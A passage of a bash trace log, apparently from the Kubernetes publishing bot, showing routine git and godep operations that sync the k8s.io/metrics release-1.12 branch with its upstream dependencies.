--exit-code\n>\tCommitting vendor/ and Godeps/Godeps.json.\n>\t+ return 1\n>\t+ echo 'Committing vendor/ and Godeps/Godeps.json.'\n>\t+ git commit -q -m 'sync: update godeps'\n>\t+ ensure-clean-working-dir\n>\t+ git diff HEAD --exit-code\n>\t++ git rev-parse --abbrev-ref HEAD\n>\t+ '[' release-1.12 '!=' master ']'\n>\t+ '[' -d vendor/ ']'\n>\t+ '[' -n '' ']'\n>\t+ apply-recursive-delete-pattern 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ '[' -z 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' ']'\n>\t+ local split_recursive_delete_pattern\n>\t+ read -r -a split_recursive_delete_pattern\n>\t+ git rm -q --ignore-unmatch -r BUILD '*/BUILD' BUILD.bazel '*/BUILD.bazel' Gopkg.toml\n>\t+ git add -u\n>\t+ git-index-clean\n>\t+ git diff --cached --exit-code\n>\t+ return 0\n>\t+ git diff --exit-code 36855396ea8fbfd0e0eea0e1c0a7b831993d7848\n>\t+ '[' true = true ']'\n>\t+ echo 'Amending last merge with godep changes.'\n>\t+ git reset --soft -q 36855396ea8fbfd0e0eea0e1c0a7b831993d7848\n>\tAmending last merge with godep changes.\n>\t+ git commit -q --amend --allow-empty -C 36855396ea8fbfd0e0eea0e1c0a7b831993d7848\n>\t+ ensure-clean-working-dir\n>\t+ git diff HEAD --exit-code\n>\t+ dst_needs_godeps_update=false\n>\t++ git rev-parse HEAD\n>\t+ dst_merge_point_commit=54091084f7efd0b66dedd951f3c849cb74378f73\n>\t+ k_pending_merge_commit=4d9bb0428a649c9d587213bfb3f0f3c7d4e9589c\n>\t+ '[' 93096364ceb105d344866854d3ca817cea8b8b91 = FLUSH_PENDING_MERGE_COMMIT ']'\n>\t+ '[' release-1.12 '!=' master ']'\n>\t+ is-merge-with-master 287f6a564fb8c264f281056011f4a66f197b18f4\n>\t+ grep -q '^Merge remote-tracking branch '\\''origin/master'\\'''\n>\t++ short-commit-message 287f6a564fb8c264f281056011f4a66f197b18f4\n>\t++ git show --format=short -q 287f6a564fb8c264f281056011f4a66f197b18f4\n>\t+ return 1\n>\t+ '[' release-1.12 '!=' master ']'\n>\t+ '[' -n 4d9bb0428a649c9d587213bfb3f0f3c7d4e9589c ']'\n>\t+ is-merge-with-master 4d9bb0428a649c9d587213bfb3f0f3c7d4e9589c\n>\t+ grep -q '^Merge remote-tracking branch '\\''origin/master'\\'''\n>\t++ short-commit-message 4d9bb0428a649c9d587213bfb3f0f3c7d4e9589c\n>\t++ git show --format=short -q 4d9bb0428a649c9d587213bfb3f0f3c7d4e9589c\n>\t+ return 1\n>\t+ is-merge 93096364ceb105d344866854d3ca817cea8b8b91\n>\t+ grep -q '^Merge: '\n>\t++ short-commit-message 93096364ceb105d344866854d3ca817cea8b8b91\n>\t++ git show --format=short -q 93096364ceb105d344866854d3ca817cea8b8b91\n>\t+ return 1\n>\t+ local pick_args=\n>\t+ is-merge 93096364ceb105d344866854d3ca817cea8b8b91\n>\t+ grep -q '^Merge: '\n>\t++ short-commit-message 93096364ceb105d344866854d3ca817cea8b8b91\n>\t++ git show --format=short -q 93096364ceb105d344866854d3ca817cea8b8b91\n>\t+ return 1\n>\t++ commit-subject 93096364ceb105d344866854d3ca817cea8b8b91\n>\t++ git show --format=%s -q 93096364ceb105d344866854d3ca817cea8b8b91\n>\tCherry-picking k8s.io/kubernetes single-commit 287f6a564fb8c264f281056011f4a66f197b18f4: reload token file for InClusterConfig every 5 minutes.\n>\t+ echo 'Cherry-picking k8s.io/kubernetes single-commit 287f6a564fb8c264f281056011f4a66f197b18f4: reload token file for InClusterConfig every 5 minutes.'\n>\t+ local squash_commits=1\n>\t+ godep-changes 93096364ceb105d344866854d3ca817cea8b8b91\n>\t+ '[' -n '' ']'\n>\t+ git diff --exit-code --quiet '93096364ceb105d344866854d3ca817cea8b8b91^' 93096364ceb105d344866854d3ca817cea8b8b91 -- Godeps/Godeps.json\n>\t+ reset-godeps '93096364ceb105d344866854d3ca817cea8b8b91^'\n>\t+ local 'f_clean_commit=93096364ceb105d344866854d3ca817cea8b8b91^'\n>\t++ git ls-tree '93096364ceb105d344866854d3ca817cea8b8b91^^{tree}' Godeps\n>\t+ '[' -n '040000 tree 57ea4779d914738dd4bdc35f3aacfb133e29118f\tGodeps' ']'\n>\t+ git checkout '93096364ceb105d344866854d3ca817cea8b8b91^' Godeps\n>\t+ git add Godeps\n>\t+ git commit -q -m 'sync: reset Godeps/Godeps.json' --allow-empty\n>\t+ squash_commits=2\n>\t+ dst_needs_godeps_update=true\n>\t++ commit-date 93096364ceb105d344866854d3ca817cea8b8b91\n>\t++ git show --format=%aD -q 93096364ceb105d344866854d3ca817cea8b8b91\n>\t+ GIT_COMMITTER_DATE='Mon, 13 Aug 2018 16:47:17 -0700'\n>\t+ git cherry-pick --keep-redundant-commits 93096364ceb105d344866854d3ca817cea8b8b91\n>\t+ squash 2\n>\t++ git rev-parse HEAD\n>\t+ local head=760c5cb6467b139d3c90167e05deb4e773129a06\n>\t+ git reset -q --soft HEAD~2\n>\t++ committer-date 760c5cb6467b139d3c90167e05deb4e773129a06\n>\t++ git show --format=%cD -q 760c5cb6467b139d3c90167e05deb4e773129a06\n>\t+ GIT_COMMITTER_DATE='Mon, 13 Aug 2018 16:47:17 -0700'\n>\t+ git commit --allow-empty -q -C 760c5cb6467b139d3c90167e05deb4e773129a06\n>\t+ '[' -z 4d9bb0428a649c9d587213bfb3f0f3c7d4e9589c ']'\n>\t+ ensure-clean-working-dir\n>\t+ git diff HEAD --exit-code\n>\t+ for f_mainline_commit in '${f_mainline_commits}' FLUSH_PENDING_MERGE_COMMIT\n>\t+ local k_mainline_commit=\n>\t+ local k_new_pending_merge_commit=\n>\t+ '[' FLUSH_PENDING_MERGE_COMMIT = FLUSH_PENDING_MERGE_COMMIT ']'\n>\t+ k_new_pending_merge_commit=FLUSH_PENDING_MERGE_COMMIT\n>\t+ '[' -n 4d9bb0428a649c9d587213bfb3f0f3c7d4e9589c ']'\n>\t+ '[' FLUSH_PENDING_MERGE_COMMIT '!=' 4d9bb0428a649c9d587213bfb3f0f3c7d4e9589c ']'\n>\t+ local dst_parent2=HEAD\n>\t+ '[' release-1.12 '!=' master ']'\n>\t+ is-merge-with-master 4d9bb0428a649c9d587213bfb3f0f3c7d4e9589c\n>\t+ grep -q '^Merge remote-tracking branch '\\''origin/master'\\'''\n>\t++ short-commit-message 4d9bb0428a649c9d587213bfb3f0f3c7d4e9589c\n>\t++ git show --format=short -q 4d9bb0428a649c9d587213bfb3f0f3c7d4e9589c\n>\t+ return 1\n>\t++ commit-subject 4d9bb0428a649c9d587213bfb3f0f3c7d4e9589c\n>\t++ git show --format=%s -q 4d9bb0428a649c9d587213bfb3f0f3c7d4e9589c\n>\tCherry-picking source dropped-merge 4d9bb0428a649c9d587213bfb3f0f3c7d4e9589c: Merge remote-tracking branch 'origin/master' into release-1.12.  Deleting CHANGELOG-1.11.md.\n>\t+ echo 'Cherry-picking source dropped-merge 4d9bb0428a649c9d587213bfb3f0f3c7d4e9589c: Merge remote-tracking branch '\\''origin/master'\\'' into release-1.12.  Deleting CHANGELOG-1.11.md.'\n>\t++ commit-date 4d9bb0428a649c9d587213bfb3f0f3c7d4e9589c\n>\t++ git show --format=%aD -q 4d9bb0428a649c9d587213bfb3f0f3c7d4e9589c\n>\t+ local 'date=Tue, 4 Sep 2018 00:05:19 +0800'\n>\t+++ commit-message 4d9bb0428a649c9d587213bfb3f0f3c7d4e9589c\n>\t+++ git show --format=%B -q 4d9bb0428a649c9d587213bfb3f0f3c7d4e9589c\n>\t+++ echo\n>\t+++ echo 'Kubernetes-commit: 4d9bb0428a649c9d587213bfb3f0f3c7d4e9589c'\n>\t++ GIT_COMMITTER_DATE='Tue, 4 Sep 2018 00:05:19 +0800'\n>\t++ GIT_AUTHOR_DATE='Tue, 4 Sep 2018 00:05:19 +0800'\n>\t++ git commit-tree -p 54091084f7efd0b66dedd951f3c849cb74378f73 -p HEAD -m 'Merge remote-tracking branch '\\''origin/master'\\'' into release-1.12.  Deleting CHANGELOG-1.11.md\n>\n>\n>\tKubernetes-commit: 4d9bb0428a649c9d587213bfb3f0f3c7d4e9589c' 'HEAD^{tree}'\n>\t+ local dst_new_merge=d0a2547b013c011f5c2632359856caf7b5b0147e\n>\t+ git reset -q --hard d0a2547b013c011f5c2632359856caf7b5b0147e\n>\t+ fix-godeps apimachinery:release-1.12,api:release-1.12,client-go:release-9.0 '' k8s.io true true true Kubernetes-commit 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ '[' '' = true ']'\n>\t+ local deps=apimachinery:release-1.12,api:release-1.12,client-go:release-9.0\n>\t+ local required_packages=\n>\t+ local base_package=k8s.io\n>\t+ local is_library=true\n>\t+ local needs_godeps_update=true\n>\t+ local squash=true\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t++ git rev-parse HEAD\n>\t+ local dst_old_commit=d0a2547b013c011f5c2632359856caf7b5b0147e\n>\t+ '[' true = true ']'\n>\t+ update_full_godeps apimachinery:release-1.12,api:release-1.12,client-go:release-9.0 k8s.io true Kubernetes-commit\n>\t+ local deps=apimachinery:release-1.12,api:release-1.12,client-go:release-9.0\n>\t+ local base_package=k8s.io\n>\t+ local is_library=true\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ ensure-clean-working-dir\n>\t+ git diff HEAD --exit-code\n>\t+ for d in '$../*'\n>\t+ '[' '!' -d '$../*' ']'\n>\t+ continue\n>\t+ '[' '!' -f Godeps/Godeps.json ']'\n>\t+ echo 'Removing k8s.io/* dependencies from Godeps.json'\n>\t+ local dep=\n>\t+ local branch=\n>\tRemoving k8s.io/* dependencies from Godeps.json\n>\t+ local depbranch=\n>\t++ basename /go-workspace/src/k8s.io/metrics\n>\t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>\t+ IFS=:\n>\t+ read dep branch\n>\t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/apimachinery/\") or . == \"k8s.io/apimachinery\") | not))' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>\t+ IFS=:\n>\t+ read dep branch\n>\t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/api/\") or . == \"k8s.io/api\") | not))' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>\t+ IFS=:\n>\t+ read dep branch\n>\t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/client-go/\") or . == \"k8s.io/client-go\") | not))' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>\t+ IFS=:\n>\t+ read dep branch\n>\t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/metrics/\") or . == \"k8s.io/metrics\") | not))' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\tRunning godep restore.\n>\t+ echo 'Running godep restore.'\n>\t+ godep restore\n>\t+ checkout-deps-to-kube-commit Kubernetes-commit apimachinery:release-1.12,api:release-1.12,client-go:release-9.0\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ deps=()\n>\t+ local deps\n>\t+ IFS=,\n>\t+ read -a deps\n>\t++ last-kube-commit Kubernetes-commit HEAD\n>\t++ local commit_msg_tag=Kubernetes-commit\n>\t++ git log --format=%B HEAD\n>\t++ head -n 1\n>\t++ sed 's/^Kubernetes-commit: //g'\n>\t++ grep '^Kubernetes-commit: '\n>\t+ local k_last_kube_commit=4d9bb0428a649c9d587213bfb3f0f3c7d4e9589c\n>\t+ '[' -z 4d9bb0428a649c9d587213bfb3f0f3c7d4e9589c ']'\n>\t++ git-find-merge 4d9bb0428a649c9d587213bfb3f0f3c7d4e9589c upstream-branch\n>\t++ tail -1\n>\t+++ git rev-list '4d9bb0428a649c9d587213bfb3f0f3c7d4e9589c^1..upstream-branch' --first-parent\n>\t++ awk 'NR==FNR{a[$1]++;next} a[$1] ' /dev/fd/63 /dev/fd/62\n>\t+++ git rev-list 4d9bb0428a649c9d587213bfb3f0f3c7d4e9589c..upstream-branch --ancestry-path\n>\t+++ git rev-parse 4d9bb0428a649c9d587213bfb3f0f3c7d4e9589c\n>\t+ local k_last_kube_merge=4d9bb0428a649c9d587213bfb3f0f3c7d4e9589c\n>\t+ local dep_count=3\n>\t+ (( i=0 ))\n>\t+ (( i<3 ))\n>\t+ local dep=apimachinery\n>\t+ local branch=release-1.12\n>\t+ echo 'Looking up which commit in the release-1.12 branch of k8s.io/apimachinery corresponds to k8s.io/kubernetes commit 4d9bb0428a649c9d587213bfb3f0f3c7d4e9589c.'\n>\tLooking up which commit in the release-1.12 branch of k8s.io/apimachinery corresponds to k8s.io/kubernetes commit 4d9bb0428a649c9d587213bfb3f0f3c7d4e9589c.\n>\t+ local k_commit=\n>\t+ local dep_commit=\n>\t+ read k_commit dep_commit\n>\t++ look -b 4d9bb0428a649c9d587213bfb3f0f3c7d4e9589c ../kube-commits-apimachinery-release-1.12\n>\t+ '[' -z b534c1958b3717070c0e78f18a8832d397bb2a92 ']'\n>\t+ pushd ../apimachinery\n>\t+ echo 'Checking out k8s.io/apimachinery to b534c1958b3717070c0e78f18a8832d397bb2a92'\n>\tChecking out k8s.io/apimachinery to b534c1958b3717070c0e78f18a8832d397bb2a92\n>\t+ git checkout -q b534c1958b3717070c0e78f18a8832d397bb2a92\n>\tLooking up which commit in the release-1.12 branch of k8s.io/api corresponds to k8s.io/kubernetes commit 4d9bb0428a649c9d587213bfb3f0f3c7d4e9589c.\n>\t+ popd\n>\t+ (( i++  ))\n>\t+ (( i<3 ))\n>\t+ local dep=api\n>\t+ local branch=release-1.12\n>\t+ echo 'Looking up which commit in the release-1.12 branch of k8s.io/api corresponds to k8s.io/kubernetes commit 4d9bb0428a649c9d587213bfb3f0f3c7d4e9589c.'\n>\t+ local k_commit=\n>\t+ local dep_commit=\n>\t+ read k_commit dep_commit\n>\t++ look -b 4d9bb0428a649c9d587213bfb3f0f3c7d4e9589c ../kube-commits-api-release-1.12\n>\t+ '[' -z aedd0c704b43ef66877a3c4877388a1d24388203 ']'\n>\t+ pushd ../api\n>\tChecking out k8s.io/api to aedd0c704b43ef66877a3c4877388a1d24388203\n>\t+ echo 'Checking out k8s.io/api to aedd0c704b43ef66877a3c4877388a1d24388203'\n>\t+ git checkout -q aedd0c704b43ef66877a3c4877388a1d24388203\n>\t+ popd\n>\t+ (( i++  ))\n>\t+ (( i<3 ))\n>\tLooking up which commit in the release-9.0 branch of k8s.io/client-go corresponds to k8s.io/kubernetes commit 4d9bb0428a649c9d587213bfb3f0f3c7d4e9589c.\n>\t+ local dep=client-go\n>\t+ local branch=release-9.0\n>\t+ echo 'Looking up which commit in the release-9.0 branch of k8s.io/client-go corresponds to k8s.io/kubernetes commit 4d9bb0428a649c9d587213bfb3f0f3c7d4e9589c.'\n>\t+ local k_commit=\n>\t+ local dep_commit=\n>\t+ read k_commit dep_commit\n>\t++ look -b 4d9bb0428a649c9d587213bfb3f0f3c7d4e9589c ../kube-commits-client-go-release-9.0\n>\t+ '[' -z df4767e910afb6a909581bc2094f9559f818180b ']'\n>\t+ pushd ../client-go\n>\tChecking out k8s.io/client-go to df4767e910afb6a909581bc2094f9559f818180b\n>\t+ echo 'Checking out k8s.io/client-go to df4767e910afb6a909581bc2094f9559f818180b'\n>\t+ git checkout -q df4767e910afb6a909581bc2094f9559f818180b\n>\t+ popd\n>\t+ (( i++  ))\n>\t+ (( i<3 ))\n>\t+ rm -rf ./Godeps\n>\t+ rm -rf ./vendor\n>\tRunning godep save.\n>\t+ echo 'Running godep save.'\n>\t+ godep save ./...\n>\t+ cp Godeps/Godeps.json Godeps/Godeps.json.preserve\n>\t+ git checkout HEAD Godeps/\n>\t+ mv Godeps/Godeps.json.preserve Godeps/Godeps.json\n>\t+ jq 'del(.Deps[].Comment)' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\t+ '[' true = true ']'\n>\t++ git rev-parse --abbrev-ref HEAD\n>\t+ '[' release-1.12 '!=' master ']'\n>\t+ echo 'Removing complete vendor/ on non-master branch because this is a library.'\n>\tRemoving complete vendor/ on non-master branch because this is a library.\n>\t+ rm -rf vendor/\n>\t+ git add Godeps/Godeps.json\n>\t+ git add vendor/ --ignore-errors\n>\t+ true\n>\t+ git-index-clean\n>\t+ git diff --cached --exit-code\n>\t+ return 1\n>\t+ echo 'Committing vendor/ and Godeps/Godeps.json.'\n>\t+ git commit -q -m 'sync: update godeps'\n>\tCommitting vendor/ and Godeps/Godeps.json.\n>\t+ ensure-clean-working-dir\n>\t+ git diff HEAD --exit-code\n>\t++ git rev-parse --abbrev-ref HEAD\n>\t+ '[' release-1.12 '!=' master ']'\n>\t+ '[' -d vendor/ ']'\n>\t+ '[' -n '' ']'\n>\t+ apply-recursive-delete-pattern 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ '[' -z 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' ']'\n>\t+ local split_recursive_delete_pattern\n>\t+ read -r -a split_recursive_delete_pattern\n>\t+ git rm -q --ignore-unmatch -r BUILD '*/BUILD' BUILD.bazel '*/BUILD.bazel' Gopkg.toml\n>\t+ git add -u\n>\t+ git-index-clean\n>\t+ git diff --cached --exit-code\n>\t+ return 0\n>\t+ git diff --exit-code d0a2547b013c011f5c2632359856caf7b5b0147e\n>\t+ '[' true = true ']'\n>\t+ echo 'Amending last merge with godep changes.'\n>\t+ git reset --soft -q d0a2547b013c011f5c2632359856caf7b5b0147e\n>\tAmending last merge with godep changes.\n>\t+ git commit -q --amend --allow-empty -C d0a2547b013c011f5c2632359856caf7b5b0147e\n>\t+ ensure-clean-working-dir\n>\t+ git diff HEAD --exit-code\n>\t+ dst_needs_godeps_update=false\n>\t++ git rev-parse HEAD\n>\t+ dst_merge_point_commit=1c28ee79e274169ac14e83bc0348939d22a13556\n>\t+ k_pending_merge_commit=FLUSH_PENDING_MERGE_COMMIT\n>\t+ '[' FLUSH_PENDING_MERGE_COMMIT = FLUSH_PENDING_MERGE_COMMIT ']'\n>\t+ break\n>\t+ echo 'Fixing up godeps after a complete sync'\n>\tFixing up godeps after a complete sync\n>\t++ git rev-parse HEAD\n>\t+ '[' 1c28ee79e274169ac14e83bc0348939d22a13556 '!=' f56bb57291287498c5e80f28abb3616dec59741a ']'\n>\t+ fix-godeps apimachinery:release-1.12,api:release-1.12,client-go:release-9.0 '' k8s.io true true true Kubernetes-commit 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ '[' '' = true ']'\n>\t+ local deps=apimachinery:release-1.12,api:release-1.12,client-go:release-9.0\n>\t+ local required_packages=\n>\t+ local base_package=k8s.io\n>\t+ local is_library=true\n>\t+ local needs_godeps_update=true\n>\t+ local squash=true\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t++ git rev-parse HEAD\n>\t+ local dst_old_commit=1c28ee79e274169ac14e83bc0348939d22a13556\n>\t+ '[' true = true ']'\n>\t+ update_full_godeps apimachinery:release-1.12,api:release-1.12,client-go:release-9.0 k8s.io true Kubernetes-commit\n>\t+ local deps=apimachinery:release-1.12,api:release-1.12,client-go:release-9.0\n>\t+ local base_package=k8s.io\n>\t+ local is_library=true\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ ensure-clean-working-dir\n>\t+ git diff HEAD --exit-code\n>\t+ for d in '$../*'\n>\t+ '[' '!' -d '$../*' ']'\n>\t+ continue\n>\t+ '[' '!' -f Godeps/Godeps.json ']'\n>\t+ echo 'Removing k8s.io/* dependencies from Godeps.json'\n>\tRemoving k8s.io/* dependencies from Godeps.json\n>\t+ local dep=\n>\t+ local branch=\n>\t+ local depbranch=\n>\t++ basename /go-workspace/src/k8s.io/metrics\n>\t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>\t+ IFS=:\n>\t+ read dep branch\n>\t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/apimachinery/\") or . == \"k8s.io/apimachinery\") | not))' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>\t+ IFS=:\n>\t+ read dep branch\n>\t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/api/\") or . == \"k8s.io/api\") | not))' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>\t+ IFS=:\n>\t+ read dep branch\n>\t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/client-go/\") or . == \"k8s.io/client-go\") | not))' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>\t+ IFS=:\n>\t+ read dep branch\n>\t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/metrics/\") or . == \"k8s.io/metrics\") | not))' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\tRunning godep restore.\n>\t+ echo 'Running godep restore.'\n>\t+ godep restore\n>\t+ checkout-deps-to-kube-commit Kubernetes-commit apimachinery:release-1.12,api:release-1.12,client-go:release-9.0\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ deps=()\n>\t+ local deps\n>\t+ IFS=,\n>\t+ read -a deps\n>\t++ last-kube-commit Kubernetes-commit HEAD\n>\t++ local commit_msg_tag=Kubernetes-commit\n>\t++ git log --format=%B HEAD\n>\t++ grep '^Kubernetes-commit: '\n>\t++ head -n 1\n>\t++ sed 's/^Kubernetes-commit: //g'\n>\t+ local k_last_kube_commit=4d9bb0428a649c9d587213bfb3f0f3c7d4e9589c\n>\t+ '[' -z 4d9bb0428a649c9d587213bfb3f0f3c7d4e9589c ']'\n>\t++ git-find-merge 4d9bb0428a649c9d587213bfb3f0f3c7d4e9589c upstream-branch\n>\t++ tail -1\n>\t+++ git rev-list '4d9bb0428a649c9d587213bfb3f0f3c7d4e9589c^1..upstream-branch' --first-parent\n>\t++ awk 'NR==FNR{a[$1]++;next} a[$1] ' /dev/fd/63 /dev/fd/62\n>\t+++ git rev-list 4d9bb0428a649c9d587213bfb3f0f3c7d4e9589c..upstream-branch --ancestry-path\n>\t+++ git rev-parse 4d9bb0428a649c9d587213bfb3f0f3c7d4e9589c\n>\t+ local k_last_kube_merge=4d9bb0428a649c9d587213bfb3f0f3c7d4e9589c\n>\t+ local dep_count=3\n>\t+ (( i=0 ))\n>\t+ (( i<3 ))\n>\t+ local dep=apimachinery\n>\t+ local branch=release-1.12\n>\t+ echo 'Looking up which commit in the release-1.12 branch of k8s.io/apimachinery corresponds to k8s.io/kubernetes commit 4d9bb0428a649c9d587213bfb3f0f3c7d4e9589c.'\n>\t+ local k_commit=\n>\tLooking up which commit in the release-1.12 branch of k8s.io/apimachinery corresponds to k8s.io/kubernetes commit 4d9bb0428a649c9d587213bfb3f0f3c7d4e9589c.\n>\t+ local dep_commit=\n>\t+ read k_commit dep_commit\n>\t++ look -b 4d9bb0428a649c9d587213bfb3f0f3c7d4e9589c ../kube-commits-apimachinery-release-1.12\n>\t+ '[' -z b534c1958b3717070c0e78f18a8832d397bb2a92 ']'\n>\t+ pushd ../apimachinery\n>\tChecking out k8s.io/apimachinery to b534c1958b3717070c0e78f18a8832d397bb2a92\n>\t+ echo 'Checking out k8s.io/apimachinery to b534c1958b3717070c0e78f18a8832d397bb2a92'\n>\t+ git checkout -q b534c1958b3717070c0e78f18a8832d397bb2a92\n>\t+ popd\n>\t+ (( i++  ))\n>\t+ (( i<3 ))\n>\t+ local dep=api\n>\t+ local branch=release-1.12\n>\t+ echo 'Looking up which commit in the release-1.12 branch of k8s.io/api corresponds to k8s.io/kubernetes commit 4d9bb0428a649c9d587213bfb3f0f3c7d4e9589c.'\n>\t+ local k_commit=\n>\tLooking up which commit in the release-1.12 branch of k8s.io/api corresponds to k8s.io/kubernetes commit 4d9bb0428a649c9d587213bfb3f0f3c7d4e9589c.\n>\t+ local dep_commit=\n>\t+ read k_commit dep_commit\n>\t++ look -b 4d9bb0428a649c9d587213bfb3f0f3c7d4e9589c ../kube-commits-api-release-1.12\n>\t+ '[' -z aedd0c704b43ef66877a3c4877388a1d24388203 ']'\n>\t+ pushd ../api\n>\tChecking out k8s.io/api to aedd0c704b43ef66877a3c4877388a1d24388203\n>\t+ echo 'Checking out k8s.io/api to aedd0c704b43ef66877a3c4877388a1d24388203'\n>\t+ git checkout -q aedd0c704b43ef66877a3c4877388a1d24388203\n>\t+ popd\n>\t+ (( i++  ))\n>\t+ (( i<3 ))\n>\t+ local dep=client-go\n>\t+ local branch=release-9.0\n>\t+ echo 'Looking up which commit in the release-9.0 branch of k8s.io/client-go corresponds to k8s.io/kubernetes commit 4d9bb0428a649c9d587213bfb3f0f3c7d4e9589c.'\n>\t+ local k_commit=\n>\t+ local dep_commit=\n>\t+ read k_commit dep_commit\n>\tLooking up which commit in the release-9.0 branch of k8s.io/client-go corresponds to k8s.io/kubernetes commit 4d9bb0428a649c9d587213bfb3f0f3c7d4e9589c.\n>\t++ look -b 4d9bb0428a649c9d587213bfb3f0f3c7d4e9589c ../kube-commits-client-go-release-9.0\n>\t+ '[' -z df4767e910afb6a909581bc2094f9559f818180b ']'\n>\t+ pushd ../client-go\n>\tChecking out k8s.io/client-go to df4767e910afb6a909581bc2094f9559f818180b\n>\t+ echo 'Checking out k8s.io/client-go to df4767e910afb6a909581bc2094f9559f818180b'\n>\t+ git checkout -q df4767e910afb6a909581bc2094f9559f818180b\n>\t+ popd\n>\t+ (( i++  ))\n>\t+ (( i<3 ))\n>\t+ rm -rf ./Godeps\n>\t+ rm -rf ./vendor\n>\tRunning godep save.\n>\t+ echo 'Running godep save.'\n>\t+ godep save ./...\n>\t+ cp Godeps/Godeps.json Godeps/Godeps.json.preserve\n>\t+ git checkout HEAD Godeps/\n>\t+ mv Godeps/Godeps.json.preserve Godeps/Godeps.json\n>\t+ jq 'del(.Deps[].Comment)' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\t+ '[' true = true ']'\n>\t++ git rev-parse --abbrev-ref HEAD\n>\t+ '[' release-1.12 '!=' master ']'\n>\t+ echo 'Removing complete vendor/ on non-master branch because this is a library.'\n>\t+ rm -rf vendor/\n>\tRemoving complete vendor/ on non-master branch because this is a library.\n>\t+ git add Godeps/Godeps.json\n>\t+ git add vendor/ --ignore-errors\n>\t+ true\n>\t+ git-index-clean\n>\t+ git diff --cached --exit-code\n>\t+ return 0\n>\t+ echo 'Godeps.json hasn'\\''t changed!'\n>\t+ ensure-clean-working-dir\n>\tGodeps.json hasn't changed!\n>\t+ git diff HEAD --exit-code\n>\t++ git rev-parse --abbrev-ref HEAD\n>\t+ '[' release-1.12 '!=' master ']'\n>\t+ '[' -d vendor/ ']'\n>\t+ '[' -n '' ']'\n>\t+ apply-recursive-delete-pattern 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ '[' -z 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' ']'\n>\t+ local split_recursive_delete_pattern\n>\t+ read -r -a split_recursive_delete_pattern\n>\t+ git rm -q --ignore-unmatch -r BUILD '*/BUILD' BUILD.bazel '*/BUILD.bazel' Gopkg.toml\n>\t+ git add -u\n>\t+ git-index-clean\n>\t+ git diff --cached --exit-code\n>\t+ return 0\n>\t+ git diff --exit-code 1c28ee79e274169ac14e83bc0348939d22a13556\n>\tRemove redundant godep commits on-top of 1c28ee79e274169ac14e83bc0348939d22a13556.\n>\t+ echo 'Remove redundant godep commits on-top of 1c28ee79e274169ac14e83bc0348939d22a13556.'\n>\t+ git reset --soft -q 1c28ee79e274169ac14e83bc0348939d22a13556\n>\t+ ensure-clean-working-dir\n>\t+ git diff HEAD --exit-code\n>\t++ basename 